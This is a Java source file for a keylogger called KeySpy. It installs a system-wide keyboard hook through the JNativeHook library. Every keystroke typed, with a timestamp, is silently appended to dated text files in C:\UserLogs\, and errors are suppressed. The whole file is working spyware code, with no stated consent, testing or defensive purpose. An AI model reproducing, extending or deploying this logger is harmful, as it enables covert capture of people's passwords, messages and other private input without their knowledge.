/* This program will listen to the key strokes typed and Pressed on a Standard Keyboard by an user and stores it in a text file. */

// Library Import for File Handling and Event Handling.
import java.io.*;
import java.awt.*;
import java.awt.event.*;

// Library Import for System Date Information.
import java.util.Date;
import java.text.DateFormat;
import java.text.SimpleDateFormat;

// Library Import for JavaNativeHook library for listening to key strokes.
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

// This is the main Class to initiate 
public class KeySpy implements NativeKeyListener {
	
	// These integers are used to store the appropriate code values of a particular key typed.
	int rawCode, keyChar, keyCode;

	// Stores the text value of that particular key typed.
	String keyText;	
		
	// Declaration and null Initialisation of Date.
	DateFormat dateFormat = null;
	DateFormat timeFormat = null;
	Date date = null;

	// Creating a FileEntry Class Variable and Intialising it with null.
	FileEntry fe = null;
	
	// This variable stores the actual content typed by user and will be stored into text file.
	String str = "";

	// This is a string variable that stores the new-line character provided by System Class and used for creating new-lines in text file.
	String newLine = System.getProperty("line.separator");
	
	// Constructor to Initialise the above variables and creates Frame.
	KeySpy(){

		//Initiates the process and saves the textfile.
		str = "Loging Started at " + getTime() + newLine + newLine;
		saveFile();
	}
	
	/* Overrided methods of NativeKeyListener Interface. */

	// Overrided Method for KeyEvent i.e., when users Presses a key.
    public void nativeKeyPressed(NativeKeyEvent e) {

    	// Get the KeyCode and KeyText of the particular key that user has Pressed.   	
		keyCode = e.getKeyCode();
		keyText = e.getKeyText(e.getKeyCode());
	}

	// Overrided Method for KeyEvent i.e., when users Releases a key.
    public void nativeKeyReleased(NativeKeyEvent e) {
    	// Do Nothing.
    }

    // Overrided Method for KeyEvent i.e., when users Types a key.
    public void nativeKeyTyped(NativeKeyEvent e) {

    	// Get RawCode and KeyChar when user types a particular key.
		rawCode = e.getRawCode();
		keyChar = e.getKeyChar();
		
		// Store all the collected data of key Typed or Pressed in to str along with the time at which key was typed or pressed.
		str = "Time : " + getTime() + "\t\tRaw Code : " + rawCode + "\tKey Code : " + keyCode + "\tKey Char : " + (char)keyChar + "\tKey Text :" + keyText;
		str = str + newLine;

		// Store of Append the string to textfile
		saveFile();
	}
	
	// Method of KeySpy Class to return Current System Time as a String.
	public String getTime() {
		timeFormat = new SimpleDateFormat("HH:mm:ss");
		date = new Date();
		return timeFormat.format(date);
	}
	
	// Method of KeySpy Class to return Current System Date as a String.
	public String getDate() {
		dateFormat = new SimpleDateFormat("dd MM yyyy");
		date = new Date();
		return dateFormat.format(date);
	}
	
	// Method of KeySpy CLass to Create or Append to text file.
	public void saveFile() {

		// Used for storing the name of Text File as "Log Entry [System Date]".
		String fileName = "Log Entry "  + getDate();

		// Create or Append the str to Text File with name as fileName using FileEntry Class.
		try {
			fe = new FileEntry(fileName, str);
		}
		catch(Exception ex) {
			// Do Nothing.
		}
	}
	
	// 'main' method of KeySpy Class.
	public static void main(String[] args) {

		// Register the NativeHook with the GlobalScreen.
        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
        	// Do Nothing.
        }

        // Add NativeKeyListener to GlobalScreen.
		GlobalScreen.addNativeKeyListener(new KeySpy());	
    }
}

// This Class is used to Create or Append to Text file.
class FileEntry {

	// Declaring Instance Variables for FileWriter and BufferedWriter Classes and Initialising with null.
	FileWriter fw = null;
	BufferedWriter bw = null;

	// Declaration of String variables fileName, fileContent and initialising defaultLocation.
	String fileName, fileContent, defaultLocation = "C:\\UserLogs\\";

	// Parameterised Contructor of the Class FileEntry that throws IOException.
	FileEntry(String tfileName, String tfileText) throws IOException {

		// Initialising fileName variable with tfileName.
		fileName = tfileName;

		// Adding '.txt' extention to the fileName.
		if(!(".txt".equalsIgnoreCase(fileName.substring(fileName.length())))) {
			fileName += ".txt";
		}

		makeDirectory();

		// Initialsing fileContent variable with tfileText.
		fileContent = tfileText;

		// Initialising fw and bw variables.
		fw = new FileWriter(defaultLocation + fileName, true);
		bw = new BufferedWriter(fw);

		// Store the fileContent to text file and close (saves the text file).
		bw.append(fileContent);
		bw.close();
	}

	public void makeDirectory() {
		File dir = new File(defaultLocation);

		if(!dir.exists()) {
			dir.mkdir();
		}
	}
}